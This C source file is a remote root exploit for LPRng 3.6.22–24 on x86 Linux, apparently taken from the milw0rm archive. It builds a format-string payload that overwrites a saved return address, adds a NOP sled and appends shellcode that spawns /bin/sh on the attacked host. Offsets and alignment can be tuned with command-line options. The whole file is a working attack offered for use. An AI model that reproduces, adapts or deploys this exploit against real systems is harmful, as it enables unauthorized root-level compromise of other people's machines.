/*
 * LPRng remote root exploit for x86 Linux
 * 9/27/00 
 *
 * - sk8
 * tested on compiled LPRng 3.6.22/23/24 
 *
 */

#include <unistd.h>
#include <stdio.h>

char sc[]=
  "\x29\xdb\x29\xc0\x29\xd2\x31\xc9\xfe\xca\xb0\x46\xcd\x80\x29\xff"
  "\x47\x47\x47\x43\x43\x43\x31\xc9\x29\xc0\xb0\x3f\xcd\x80\x41\x39"
  "\xf9\x75\xf5\x39\xd3\x7e\xee\xeb\x19\x5e\x89\xf3\x89\xf7\x83\xc7"
  "\x07\x31\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x31\xc0\xab\xb0\x0b"
  "\xcd\x80\xe8\xe2\xff\xff\xff/bin/sh";

#define NOP 0x90 //will be split up, doesn't matter
int main(int argc, char** argv) {
  char getbuf[1000];
  int bpad=0; /* was 2 */ /* 3 for other */
  /* 2 - -34
     3 - -41
     0 - -42
  */
  int i=0;
  int eiploc=0x41424344;
  char buffer[1024];
  char fmtbuf[128];
  int shloc=-1; //0xbffff2c8;
  int hi=100; 
  int lo=200;
  int pre=0;
  int align=-36;

  int pos=511; //483; //488; /*299;*/
  int debug=0;
  char s=0;
  char mode='n';

  while ((s=getopt(argc, argv, "a:b:e:s:p:d")) != EOF) {
    switch(s) {
      case 'a': align=atoi(optarg); break;
      case 'b': bpad=atoi(optarg);
          break;
      case 'e': eiploc=strtoul(optarg, 0,0);
          break;
      case 's': shloc=strtoul(optarg, 0, 0);
          break;
      case 'p': pos=atoi(optarg); break;
      case 'd': debug=1; break;
      default:
    }
  }  
  if (shloc == -1) shloc=eiploc+2450;

  memset(buffer, 0, sizeof(buffer));
  memset(fmtbuf, 0, sizeof(fmtbuf));

  memset(buffer, 'B', bpad);
  *(long*)(buffer+strlen(buffer))=eiploc+2;
  *(long*)(buffer+strlen(buffer))=0x50505050;
  *(long*)(buffer+strlen(buffer))=eiploc;
  pre=strlen(buffer);

  if (debug) { mode='p'; hi=100; lo=100; }
  else {
    hi=((shloc >> 16)&0xffff)-pre+align; /* was no 7 */
    lo=((shloc >> 0)&0xffff)+0x10000-((shloc >> 16)&0xffff);
  }
  sprintf(fmtbuf, "%%%dd%%%d$h%c%%%dd%%%d$h%c", hi, pos, mode, lo, pos+2, mode);
  strcat(buffer+strlen(buffer), fmtbuf);
  /* make it easier to hit shellcode */
  memset(buffer+strlen(buffer), NOP, 385);
  strcat(buffer, sc);
  *(char*)(buffer+strlen(buffer))=0;

  fprintf(stderr, "strlen(fmtbuf): %i\n", strlen(fmtbuf));
  fprintf(stderr, "pos: %i\n", pos);
  fprintf(stderr, "align: %i\n", align);
  fprintf(stderr, "eip location: 0x%x\n", eiploc);
  fprintf(stderr, "shellcode location: 0x%x\n", shloc);
  fprintf(stderr, "strlen(sc): %i\n", strlen(sc));
  fprintf(stderr, "strlen(buffer): %i\n", strlen(buffer));
  printf("%s", buffer);
  putchar('\n');
}


// milw0rm.com [2000-12-11]
